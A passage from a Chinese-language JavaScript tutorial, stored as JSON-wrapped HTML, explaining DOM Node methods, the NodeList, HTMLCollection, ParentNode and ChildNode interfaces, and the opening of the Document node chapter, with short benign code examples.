href='#Node.prototype.removeChild()' class='header-anchor'>#</a>\n            <span>Node.prototype.removeChild()</span>\n        </h3>\n    <p><code>removeChild</code>方法接受一个子节点作为参数，用于从当前节点移除该子节点。返回值是移除的子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var divA = document.getElementById(&#039;A&#039;);\ndivA.parentNode.removeChild(divA);</code></pre><p>上面代码移除了<code>divA</code>节点。注意，这个方法是在<code>divA</code>的父节点上调用的，不是在<code>divA</code>上调用的。</p>\n<p>下面是如何移除当前节点的所有子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var element = document.getElementById(&#039;top&#039;);\nwhile (element.firstChild) {\n  element.removeChild(element.firstChild);\n}</code></pre><p>被移除的节点依然存在于内存之中，但不再是 DOM 的一部分。所以，一个节点移除以后，依然可以使用它，比如插入到另一个节点下面。</p>\n<p>如果参数节点不是当前节点的子节点，<code>removeChild</code>方法将报错。</p>\n\n        <h3>\n            <a href='#Node.prototype.replaceChild()' class='header-anchor'>#</a>\n            <span>Node.prototype.replaceChild()</span>\n        </h3>\n    <p><code>replaceChild</code>方法用于将一个新的节点，替换当前节点的某一个子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var replacedNode = parentNode.replaceChild(newChild, oldChild);</code></pre><p>上面代码中，<code>replaceChild</code>方法接受两个参数，第一个参数<code>newChild</code>是用来替换的新节点，第二个参数<code>oldChild</code>是将要替换走的子节点。返回值是替换走的那个节点<code>oldChild</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var divA = document.getElementById(&#039;divA&#039;);\nvar newSpan = document.createElement(&#039;span&#039;);\nnewSpan.textContent = &#039;Hello World!&#039;;\ndivA.parentNode.replaceChild(newSpan, divA);</code></pre><p>上面代码是如何将指定节点<code>divA</code>替换走。</p>\n\n        <h3>\n            <a href='#Node.prototype.contains()' class='header-anchor'>#</a>\n            <span>Node.prototype.contains()</span>\n        </h3>\n    <p><code>contains</code>方法返回一个布尔值，表示参数节点是否满足以下三个条件之一。</p>\n<ul>\n<li>参数节点为当前节点。</li>\n<li>参数节点为当前节点的子节点。</li>\n<li>参数节点为当前节点的后代节点。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>document.body.contains(node)</code></pre><p>上面代码检查参数节点<code>node</code>，是否包含在当前文档之中。</p>\n<p>注意，当前节点传入<code>contains</code>方法，返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>nodeA.contains(nodeA) // true</code></pre>\n        <h3>\n            <a href='#Node.prototype.compareDocumentPosition()' class='header-anchor'>#</a>\n            <span>Node.prototype.compareDocumentPosition()</span>\n        </h3>\n    <p><code>compareDocumentPosition</code>方法的用法，与<code>contains</code>方法完全一致，返回一个七个比特位的二进制值，表示参数节点与当前节点的关系。</p>\n<table>\n<thead>\n<tr>\n<th>二进制值</th>\n<th>十进制值</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>000000</td>\n<td>0</td>\n<td>两个节点相同</td>\n</tr>\n<tr>\n<td>000001</td>\n<td>1</td>\n<td>两个节点不在同一个文档（即有一个节点不在当前文档）</td>\n</tr>\n<tr>\n<td>000010</td>\n<td>2</td>\n<td>参数节点在当前节点的前面</td>\n</tr>\n<tr>\n<td>000100</td>\n<td>4</td>\n<td>参数节点在当前节点的后面</td>\n</tr>\n<tr>\n<td>001000</td>\n<td>8</td>\n<td>参数节点包含当前节点</td>\n</tr>\n<tr>\n<td>010000</td>\n<td>16</td>\n<td>当前节点包含参数节点</td>\n</tr>\n<tr>\n<td>100000</td>\n<td>32</td>\n<td>浏览器内部使用</td>\n</tr>\n</tbody></table>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;mydiv&quot;&gt;\n//   &lt;form&gt;&lt;input id=&quot;test&quot; /&gt;&lt;/form&gt;\n// &lt;/div&gt;\n\nvar div = document.getElementById(&#039;mydiv&#039;);\nvar input = document.getElementById(&#039;test&#039;);\n\ndiv.compareDocumentPosition(input) // 20\ninput.compareDocumentPosition(div) // 10</code></pre><p>上面代码中，节点<code>div</code>包含节点<code>input</code>（二进制<code>010000</code>），而且节点<code>input</code>在节点<code>div</code>的后面（二进制<code>000100</code>），所以第一个<code>compareDocumentPosition</code>方法返回<code>20</code>（二进制<code>010100</code>，即<code>010000 + 000100</code>），第二个<code>compareDocumentPosition</code>方法返回<code>10</code>（二进制<code>001010</code>）。</p>\n<p>由于<code>compareDocumentPosition</code>返回值的含义，定义在每一个比特位上，所以如果要检查某一种特定的含义，就需要使用比特位运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var head = document.head;\nvar body = document.body;\nif (head.compareDocumentPosition(body) &amp; 4) {\n  console.log(&#039;文档结构正确&#039;);\n} else {\n  console.log(&#039;&lt;body&gt; 不能在 &lt;head&gt; 前面&#039;);\n}</code></pre><p>上面代码中，<code>compareDocumentPosition</code>的返回值与<code>4</code>（又称掩码）进行与运算（<code>&amp;</code>），得到一个布尔值，表示<code>&lt;head&gt;</code>是否在<code>&lt;body&gt;</code>前面。</p>\n\n        <h3>\n            <a href='#Node.prototype.isEqualNode()，Node.prototype.isSameNode()' class='header-anchor'>#</a>\n            <span>Node.prototype.isEqualNode()，Node.prototype.isSameNode()</span>\n        </h3>\n    <p><code>isEqualNode</code>方法返回一个布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p1 = document.createElement(&#039;p&#039;);\nvar p2 = document.createElement(&#039;p&#039;);\n\np1.isEqualNode(p2) // true</code></pre><p><code>isSameNode</code>方法返回一个布尔值，表示两个节点是否为同一个节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p1 = document.createElement(&#039;p&#039;);\nvar p2 = document.createElement(&#039;p&#039;);\n\np1.isSameNode(p2) // false\np1.isSameNode(p1) // true</code></pre>\n        <h3>\n            <a href='#Node.prototype.normalize()' class='header-anchor'>#</a>\n            <span>Node.prototype.normalize()</span>\n        </h3>\n    <p><code>normailize</code>方法用于清理当前节点内部的所有文本节点（text）。它会去除空的文本节点，并且将毗邻的文本节点合并成一个，也就是说不存在空的文本节点，以及毗邻的文本节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var wrapper = document.createElement(&#039;div&#039;);\n\nwrapper.appendChild(document.createTextNode(&#039;Part 1 &#039;));\nwrapper.appendChild(document.createTextNode(&#039;Part 2 &#039;));\n\nwrapper.childNodes.length // 2\nwrapper.normalize();\nwrapper.childNodes.length // 1</code></pre><p>上面代码使用<code>normalize</code>方法之前，<code>wrapper</code>节点有两个毗邻的文本子节点。使用<code>normalize</code>方法之后，两个文本子节点被合并成一个。</p>\n<p>该方法是<code>Text.splitText</code>的逆方法，可以查看《Text 节点对象》一章，了解更多内容。</p>\n\n        <h3>\n            <a href='#Node.prototype.getRootNode()' class='header-anchor'>#</a>\n            <span>Node.prototype.getRootNode()</span>\n        </h3>\n    <p><code>getRootNode</code>方法返回当前节点所在文档的根节点，与<code>ownerDocument</code>属性的作用相同。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.body.firstChild.getRootNode() === document\n// true\ndocument.body.firstChild.getRootNode() === document.body.firstChild.ownerDocument\n// true</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"DOM","link":"javascript:void(0)"},{"title":"NodeList 接口，HTMLCollection 接口","link":"/dom/nodelist.html"}],"content":"\n        <h1>\n            <a href='#NodeList-接口，HTMLCollection-接口' class='header-anchor'>#</a>\n            <span>NodeList 接口，HTMLCollection 接口</span>\n        </h1>\n    <p>节点都是单个对象，有时需要一种数据结构，能够容纳多个节点。DOM 提供两种节点集合，用于容纳多个节点：<code>NodeList</code>和<code>HTMLCollection</code>。</p>\n<p>这两种集合都属于接口规范。许多 DOM 属性和方法，返回的结果是<code>NodeList</code>实例或<code>HTMLCollection</code>实例。主要区别是，<code>NodeList</code>可以包含各种类型的节点，<code>HTMLCollection</code>只能包含 HTML 元素节点。</p>\n\n        <h2>\n            <a href='#NodeList-接口' class='header-anchor'>#</a>\n            <span>NodeList 接口</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p><code>NodeList</code>实例是一个类似数组的对象，它的成员是节点对象。通过以下方法可以得到<code>NodeList</code>实例。</p>\n<ul>\n<li><code>Node.childNodes</code></li>\n<li><code>document.querySelectorAll()</code>等节点搜索方法</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>document.body.childNodes instanceof NodeList // true</code></pre><p><code>NodeList</code>实例很像数组，可以使用<code>length</code>属性和<code>forEach</code>方法。但是，它不是数组，不能使用<code>pop</code>或<code>push</code>之类数组特有的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var children = document.body.childNodes;\n\nArray.isArray(children) // false\n\nchildren.length // 34\nchildren.forEach(console.log)</code></pre><p>上面代码中，NodeList 实例<code>children</code>不是数组，但是具有<code>length</code>属性和<code>forEach</code>方法。</p>\n<p>如果<code>NodeList</code>实例要使用数组方法，可以将其转为真正的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var children = document.body.childNodes;\nvar nodeArr = Array.prototype.slice.call(children);</code></pre><p>除了使用<code>forEach</code>方法遍历 NodeList 实例，还可以使用<code>for</code>循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var children = document.body.childNodes;\n\nfor (var i = 0; i &lt; children.length; i++) {\n  var item = children[i];\n}</code></pre><p>注意，NodeList 实例可能是动态集合，也可能是静态集合。所谓动态集合就是一个活的集合，DOM 删除或新增一个相关节点，都会立刻反映在 NodeList 实例。目前，只有<code>Node.childNodes</code>返回的是一个动态集合，其他的 NodeList 都是静态集合。</p>\n<pre class=\"prettyprint language-javascript\"><code>var children = document.body.childNodes;\nchildren.length // 18\ndocument.body.appendChild(document.createElement(&#039;p&#039;));\nchildren.length // 19</code></pre><p>上面代码中，文档增加一个子节点，NodeList 实例<code>children</code>的<code>length</code>属性就增加了1。</p>\n\n        <h3>\n            <a href='#NodeList.prototype.length' class='header-anchor'>#</a>\n            <span>NodeList.prototype.length</span>\n        </h3>\n    <p><code>length</code>属性返回 NodeList 实例包含的节点数量。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.getElementsByTagName(&#039;xxx&#039;).length\n// 0</code></pre><p>上面代码中，<code>document.getElementsByTagName</code>返回一个 NodeList 集合。对于那些不存在的 HTML 标签，<code>length</code>属性返回<code>0</code>。</p>\n\n        <h3>\n            <a href='#NodeList.prototype.forEach()' class='header-anchor'>#</a>\n            <span>NodeList.prototype.forEach()</span>\n        </h3>\n    <p><code>forEach</code>方法用于遍历 NodeList 的所有成员。它接受一个回调函数作为参数，每一轮遍历就执行一次这个回调函数，用法与数组实例的<code>forEach</code>方法完全一致。</p>\n<pre class=\"prettyprint language-javascript\"><code>var children = document.body.childNodes;\nchildren.forEach(function f(item, i, list) {\n  // ...\n}, this);</code></pre><p>上面代码中，回调函数<code>f</code>的三个参数依次是当前成员、位置和当前 NodeList 实例。<code>forEach</code>方法的第二个参数，用于绑定回调函数内部的<code>this</code>，该参数可省略。</p>\n\n        <h3>\n            <a href='#NodeList.prototype.item()' class='header-anchor'>#</a>\n            <span>NodeList.prototype.item()</span>\n        </h3>\n    <p><code>item</code>方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.body.childNodes.item(0)</code></pre><p>上面代码中，<code>item(0)</code>返回第一个成员。</p>\n<p>如果参数值大于实际长度，或者索引不合法（比如负数），<code>item</code>方法返回<code>null</code>。如果省略参数，<code>item</code>方法会报错。</p>\n<p>所有类似数组的对象，都可以使用方括号运算符取出成员。一般情况下，都是使用方括号运算符，而不使用<code>item</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.body.childNodes[0]</code></pre>\n        <h3>\n            <a href='#NodeList.prototype.keys()，NodeList.prototype.values()，NodeList.prototype.entries()' class='header-anchor'>#</a>\n            <span>NodeList.prototype.keys()，NodeList.prototype.values()，NodeList.prototype.entries()</span>\n        </h3>\n    <p>这三个方法都返回一个 ES6 的遍历器对象，可以通过<code>for...of</code>循环遍历获取每一个成员的信息。区别在于，<code>keys()</code>返回键名的遍历器，<code>values()</code>返回键值的遍历器，<code>entries()</code>返回的遍历器同时包含键名和键值的信息。</p>\n<pre class=\"prettyprint language-javascript\"><code>var children = document.body.childNodes;\n\nfor (var key of children.keys()) {\n  console.log(key);\n}\n// 0\n// 1\n// 2\n// ...\n\nfor (var value of children.values()) {\n  console.log(value);\n}\n// #text\n// &lt;script&gt;\n// ...\n\nfor (var entry of children.entries()) {\n  console.log(entry);\n}\n// Array [ 0, #text ]\n// Array [ 1, &lt;script&gt; ]\n// ...</code></pre>\n        <h2>\n            <a href='#HTMLCollection-接口' class='header-anchor'>#</a>\n            <span>HTMLCollection 接口</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p><code>HTMLCollection</code>是一个节点对象的集合，只能包含元素节点（element），不能包含其他类型的节点。它的返回值是一个类似数组的对象，但是与<code>NodeList</code>接口不同，<code>HTMLCollection</code>没有<code>forEach</code>方法，只能使用<code>for</code>循环遍历。</p>\n<p>返回<code>HTMLCollection</code>实例的，主要是一些<code>Document</code>对象的集合属性，比如<code>document.links</code>、<code>docuement.forms</code>、<code>document.images</code>等。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.links instanceof HTMLCollection // true</code></pre><p><code>HTMLCollection</code>实例都是动态集合，节点的变化会实时反映在集合中。</p>\n<p>如果元素节点有<code>id</code>或<code>name</code>属性，那么<code>HTMLCollection</code>实例上面，可以使用<code>id</code>属性或<code>name</code>属性引用该节点元素。如果没有对应的节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;img id=&quot;pic&quot; src=&quot;http://example.com/foo.jpg&quot;&gt;\n\nvar pic = document.getElementById(&#039;pic&#039;);\ndocument.images.pic === pic // true</code></pre><p>上面代码中，<code>document.images</code>是一个<code>HTMLCollection</code>实例，可以通过<code>&lt;img&gt;</code>元素的<code>id</code>属性值，从<code>HTMLCollection</code>实例上取到这个元素。</p>\n\n        <h3>\n            <a href='#HTMLCollection.prototype.length' class='header-anchor'>#</a>\n            <span>HTMLCollection.prototype.length</span>\n        </h3>\n    <p><code>length</code>属性返回<code>HTMLCollection</code>实例包含的成员数量。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.links.length // 18</code></pre>\n        <h3>\n            <a href='#HTMLCollection.prototype.item()' class='header-anchor'>#</a>\n            <span>HTMLCollection.prototype.item()</span>\n        </h3>\n    <p><code>item</code>方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>var c = document.images;\nvar img0 = c.item(0);</code></pre><p>上面代码中，<code>item(0)</code>表示返回0号位置的成员。由于方括号运算符也具有同样作用，而且使用更方便，所以一般情况下，总是使用方括号运算符。</p>\n<p>如果参数值超出成员数量或者不合法（比如小于0），那么<code>item</code>方法返回<code>null</code>。</p>\n\n        <h3>\n            <a href='#HTMLCollection.prototype.namedItem()' class='header-anchor'>#</a>\n            <span>HTMLCollection.prototype.namedItem()</span>\n        </h3>\n    <p><code>namedItem</code>方法的参数是一个字符串，表示<code>id</code>属性或<code>name</code>属性的值，返回对应的元素节点。如果没有对应的节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;img id=&quot;pic&quot; src=&quot;http://example.com/foo.jpg&quot;&gt;\n\nvar pic = document.getElementById(&#039;pic&#039;);\ndocument.images.namedItem(&#039;pic&#039;) === pic // true</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"DOM","link":"javascript:void(0)"},{"title":"ParentNode 接口，ChildNode 接口","link":"/dom/parentnode.html"}],"content":"\n        <h1>\n            <a href='#ParentNode-接口，ChildNode-接口' class='header-anchor'>#</a>\n            <span>ParentNode 接口，ChildNode 接口</span>\n        </h1>\n    <p>节点对象除了继承 Node 接口以外，还会继承其他接口。<code>ParentNode</code>接口表示当前节点是一个父节点，提供一些处理子节点的方法。<code>ChildNode</code>接口表示当前节点是一个子节点，提供一些相关方法。</p>\n\n        <h2>\n            <a href='#ParentNode-接口' class='header-anchor'>#</a>\n            <span>ParentNode 接口</span>\n        </h2>\n    <p>如果当前节点是父节点，就会继承<code>ParentNode</code>接口。由于只有元素节点（element）、文档节点（document）和文档片段节点（documentFragment）拥有子节点，因此只有这三类节点会继承<code>ParentNode</code>接口。</p>\n\n        <h3>\n            <a href='#ParentNode.children' class='header-anchor'>#</a>\n            <span>ParentNode.children</span>\n        </h3>\n    <p><code>children</code>属性返回一个<code>HTMLCollection</code>实例，成员是当前节点的所有元素子节点。该属性只读。</p>\n<p>下面是遍历某个节点的所有元素子节点的示例。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (var i = 0; i &lt; el.children.length; i++) {\n  // ...\n}</code></pre><p>注意，<code>children</code>属性只包括元素子节点，不包括其他类型的子节点（比如文本子节点）。如果没有元素类型的子节点，返回值<code>HTMLCollection</code>实例的<code>length</code>属性为<code>0</code>。</p>\n<p>另外，<code>HTMLCollection</code>是动态集合，会实时反映 DOM 的任何变化。</p>\n\n        <h3>\n            <a href='#ParentNode.firstElementChild' class='header-anchor'>#</a>\n            <span>ParentNode.firstElementChild</span>\n        </h3>\n    <p><code>firstElementChild</code>属性返回当前节点的第一个元素子节点。如果没有任何元素子节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.firstElementChild.nodeName\n// &quot;HTML&quot;</code></pre><p>上面代码中，<code>document</code>节点的第一个元素子节点是<code>&lt;HTML&gt;</code>。</p>\n\n        <h3>\n            <a href='#ParentNode.lastElementChild' class='header-anchor'>#</a>\n            <span>ParentNode.lastElementChild</span>\n        </h3>\n    <p><code>lastElementChild</code>属性返回当前节点的最后一个元素子节点，如果不存在任何元素子节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.lastElementChild.nodeName\n// &quot;HTML&quot;</code></pre><p>上面代码中，<code>document</code>节点的最后一个元素子节点是<code>&lt;HTML&gt;</code>（因为<code>document</code>只包含这一个元素子节点）。</p>\n\n        <h3>\n            <a href='#ParentNode.childElementCount' class='header-anchor'>#</a>\n            <span>ParentNode.childElementCount</span>\n        </h3>\n    <p><code>childElementCount</code>属性返回一个整数，表示当前节点的所有元素子节点的数目。如果不包含任何元素子节点，则返回<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.body.childElementCount // 13</code></pre>\n        <h3>\n            <a href='#ParentNode.append()，ParentNode.prepend()' class='header-anchor'>#</a>\n            <span>ParentNode.append()，ParentNode.prepend()</span>\n        </h3>\n    <p><code>append</code>方法为当前节点追加一个或多个子节点，位置是最后一个元素子节点的后面。</p>\n<p>该方法不仅可以添加元素子节点，还可以添加文本子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var parent = document.body;\n\n// 添加元素子节点\nvar p = document.createElement(&#039;p&#039;);\nparent.append(p);\n\n// 添加文本子节点\nparent.append(&#039;Hello&#039;);\n\n// 添加多个元素子节点\nvar p1 = document.createElement(&#039;p&#039;);\nvar p2 = document.createElement(&#039;p&#039;);\nparent.append(p1, p2);\n\n// 添加元素子节点和文本子节点\nvar p = document.createElement(&#039;p&#039;);\nparent.append(&#039;Hello&#039;, p);</code></pre><p>注意，该方法没有返回值。</p>\n<p><code>prepend</code>方法为当前节点追加一个或多个子节点，位置是第一个元素子节点的前面。它的用法与<code>append</code>方法完全一致，也是没有返回值。</p>\n\n        <h2>\n            <a href='#ChildNode-接口' class='header-anchor'>#</a>\n            <span>ChildNode 接口</span>\n        </h2>\n    <p>如果一个节点有父节点，那么该节点就继承了<code>ChildNode</code>接口。</p>\n\n        <h3>\n            <a href='#ChildNode.remove()' class='header-anchor'>#</a>\n            <span>ChildNode.remove()</span>\n        </h3>\n    <p><code>remove</code>方法用于从父节点移除当前节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>el.remove()</code></pre><p>上面代码在 DOM 里面移除了<code>el</code>节点。</p>\n\n        <h3>\n            <a href='#ChildNode.before()，ChildNode.after()' class='header-anchor'>#</a>\n            <span>ChildNode.before()，ChildNode.after()</span>\n        </h3>\n    <p><code>before</code>方法用于在当前节点的前面，插入一个或多个同级节点。两者拥有相同的父节点。</p>\n<p>注意，该方法不仅可以插入元素节点，还可以插入文本节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p = document.createElement(&#039;p&#039;);\nvar p1 = document.createElement(&#039;p&#039;);\n\n// 插入元素节点\nel.before(p);\n\n// 插入文本节点\nel.before(&#039;Hello&#039;);\n\n// 插入多个元素节点\nel.before(p, p1);\n\n// 插入元素节点和文本节点\nel.before(p, &#039;Hello&#039;);</code></pre><p><code>after</code>方法用于在当前节点的后面，插入一个或多个同级节点，两者拥有相同的父节点。用法与<code>before</code>方法完全相同。</p>\n\n        <h3>\n            <a href='#ChildNode.replaceWith()' class='header-anchor'>#</a>\n            <span>ChildNode.replaceWith()</span>\n        </h3>\n    <p><code>replaceWith</code>方法使用参数节点，替换当前节点。参数可以是元素节点，也可以是文本节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var span = document.createElement(&#039;span&#039;);\nel.replaceWith(span);</code></pre><p>上面代码中，<code>el</code>节点将被<code>span</code>节点替换。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"DOM","link":"javascript:void(0)"},{"title":"Document 节点","link":"/dom/document.html"}],"content":"\n        <h1>\n            <a href='#Document-节点' class='header-anchor'>#</a>\n            <span>Document 节点</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>document</code>节点对象代表整个文档，每张网页都有自己的<code>document</code>对象。<code>window.document</code>属性就指向这个对象。只要浏览器开始载入 HTML 文档，该对象就存在了，可以直接使用。</p>\n<p><code>document</code>对象有不同的办法可以获取。</p>\n<ul>\n<li>正常的网页，直接使用<code>document</code>或<code>window.document</code>。</li>\n<li><code>iframe</code>框架里面的网页，使用<code>iframe</code>节点的<code>contentDocument</code>属性。</li>\n<li>Ajax 操作返回的文档，使用<code>XMLHttpRequest</code>对象的<code>responseXML</code>属性。</li>\n<li>内部节点的<code>ownerDocument</code>属性。</li>\n</ul>\n<p><code>document</code>对象继承了<code>EventTarget</code>接口、<code>Node</code>接口、<code>ParentNode</code>接口。这意味着，这些接口的方法都可以在<code>document</code>对象上调用。除此之外，<code>document</code>对象还有很多自己的属性和方法。</p>\n\n        <h2>\n            <a href='#属性' class='header-anchor'>#</a>\n            <span>属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#快捷方式属性' class='header-anchor'>#</a>\n            <span>快捷方式属性</span>\n        </h3>\n    <p>以下属性是指向文档内部的某个节点的快捷方式。</p>\n<p><strong>（1）document.defaultView</strong></p>\n<p><code>document.defaultView</code>属性返回<code>document</code>对象所属的<code>window</code>对象。如果当前文档不属于<code>window</code>对象，该属性返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.defaultView === window // true</code></pre><p><strong>（2）document.doctype</strong></p>\n<p>对于 HTML 文档来说，<code>document</code>对象一般有两个子节点。第一个子节点是<code>document.doctype</code>，指向<code>&lt;DOCTYPE&gt;</code>节点，即文档类型（Document Type Declaration，简写DTD）节点。HTML 的文档类型节点，一般写成<code>&lt;!DOCTYPE html&gt;</code>。如果网页没有声明 DTD，该属性返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var doctype = document.doctype;\ndoctype // &quot;&lt;!DOCTYPE html&gt;&quot;\ndoctype.name // &quot;html&quot;</code></pre><p><code>document.firstChild</code>通常就返回这个节点。</p>\n<p><strong>（3）document.documentElement</strong></p>\n<p><code>document.documentElement</code>属性返回当前文档的根元素节点（root）。它通常是<code>document</code>节点的第二个子节点，紧跟在<code>document.doctype</code>节点后面。HTML网页的该属性，一般是<code>&lt;html&gt;</code>节点。</p>\n<p><strong>（4）document.body，document.head</strong></p>\n<p><code>document.body</code>属性指向<code>&lt;body&gt;</code>节点，<code>document.head</code>属性指向<code>&lt;head&gt;</code>节点。</p>\n<p>这两个属性总是存在的，如果网页源码里面省略了<code>&lt;head&gt;</code>或<code>&lt;body&gt;</code>，浏览器会自动创建。另外，这两个属性是可写的，如果改写它们的值，相当于移除所有子节点。</p>\n<p><strong>（5）document.scrollingElement</strong></p>\n<p><code>document.scrollingElement</code>属性返回文档的滚动元素。也就是说，当文档整体滚动时，到底是哪个元素在滚动。</p>\n<p>标准模式下，这个属性返回的文档的根元素<code>document.documentElement</code>（即<code>&lt;html&gt;</code>）。兼容（quirk）模式下，返回的是<code>&lt;body&gt;</code>元素，如果该元素不存在，返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 页面滚动到浏览器顶部\ndocument.scrollingElement.scrollTop = 0;</code></pre><p><strong>（6）document.activeElement</strong></p>\n<p><code>document.activeElement</code>属性返回获得当前焦点（focus）的 DOM 元素。通常，这个属性返回的是<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>、<code>&lt;select&gt;</code>等表单元素，如果当前没有焦点元素，返回<code>&lt;body&gt;</code>元素或<code>null</code>。</p>\n<p><strong>（7）document.fullscreenElement</strong></p>\n<p><code>document.fullscreenElement</code>属性返回当前以全屏状态展示的 DOM 元素。如果不是全屏状态，该属性返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (document.fullscreenElement.nodeName == &#039;VIDEO&#039;) {\n  console.log(&#039;全屏播放视频&#039;);\n}</code></pre><p>上面代码中，通过<code>document.fullscreenElement</code>可以知道<code>&lt;video&gt;</code>元素有没有处在全屏状态，从而判断用户行为。</p>\n\n        <h3>\n            <a href='#节点集合属性' class='header-anchor'>#</a>\n            <span>节点集合属性</span>\n        </h3>\n    <p>以下属性返回一个<code>HTMLCollection</code>实例，表示文档内部特定元素的集合。这些集合都是动态的，原节点有任何变化，立刻会反映在集合中。</p>\n<p><strong>（1）document.links</strong></p>\n<p><code>document.links</code>属性返回当前文档所有设定了<code>href</code>属性的<code>&lt;a&gt;</code>及<code>&lt;area&gt;</code>节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 打印文档所有的链接\nvar links = document.links;\nfor(var i = 0; i &lt; links.length; i++) {\n  console.log(links[i]);\n}</code></pre><p><strong>（2）document.forms</strong></p>\n<p><code>document.forms</code>属性返回所有<code>&lt;form&gt;</code>表单节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var selectForm = document.forms[0];</code></pre><p>上面代码获取文档第一个表单。</p>\n<p>除了使用位置序号，<code>id</code>属性和<code>name</code>属性也可以用来引用表单。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n  &lt;form name=&quot;foo&quot; id=&quot;bar&quot;&gt;&lt;/form&gt;\n*/\ndocument.forms[0] === document.forms.foo // true\ndocument.forms.bar === document.forms.foo // true</code></pre><p><strong>（3）document.images</strong></p>\n<p><code>document.images</code>属性返回页面所有<code>&lt;img&gt;</code>图片节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var imglist = document.images;\n\nfor(var i = 0; i &lt; imglist.length; i++) {\n  if (imglist[i].src === &#039;banner.gif&#039;) {\n    // ...\n  }\n}</code></pre><p>上面代码在所有<code>img</code>标签中，寻找某张图片。</p>\n<p><strong>（4）document.embeds，document.plugins</strong></p>\n<p><code>document.embeds</code>属性和<code>document.plugins</code>属性，都返回所有<code>&lt;embed&gt;</code>节点。</p>\n<p><strong>（5）document.scripts</strong></p>\n<p><code>document.scripts</code>属性返回所有<code>&lt;script&gt;</code>节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var scripts = document.scripts;\nif (scripts.length !== 0 ) {\n  console.log(&#039;当前网页有脚本&#039;);\n}</code></pre><p><strong>（6）document.styleSheets</strong></p>\n<p><code>document.styleSheets</code>属性返回文档内嵌或引入的样式表集合，详细介绍请看《CSS 对象模型》一章。</p>\n<p><strong>（7）小结</strong></p>\n<p>除了<code>document.styleSheets</code>，以上的集合属性返回的都是<code>HTMLCollection</code>实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.links instanceof HTMLCollection // true\ndocument.images instanceof HTMLCollection // true\ndocument.forms instanceof HTMLCollection // true\ndocument.embeds instanceof HTMLCollection // true\ndocument.scripts instanceof HTMLCollection // true</code></pre><p><code>HTMLCollection</code>实例是类似数组的对象，所以这些属性都有<code>length</code>属性，都可以使用方括号运算符引用成员。如果成员有<code>id</code>或<code>name</code>属性，还可以用这两个属性的值，在<code>HTMLCollection</code>实例上引用到这个成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;form name=&quot;myForm&quot;&gt;\ndocument.myForm === document.forms.myForm // true</code></pre>\n        <h3>\n            <a href='#文档静态信息属性' class='header-anchor'>#</a>\n            <span>文档静态信息属性</span>\n        </h3>\n    <p>以下属性返回文档信息。</p>\n<p><strong>（1）document.documentURI，document.URL</strong></p>\n<p><code>document.documentURI</code>属性和<code>document.URL</code>属性都返回一个字符串，表示当前文档的网址。不同之处是它们继承自不同的接口，<code>documentURI</code>继承自<code>Document</code>接口，可用于所有文档；<code>URL</code>继承自<code>HTMLDocument</code>接口，只能用于 HTML 文档。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.URL\n// http://www.example.com/about\n\ndocument.documentURI === document.URL\n// 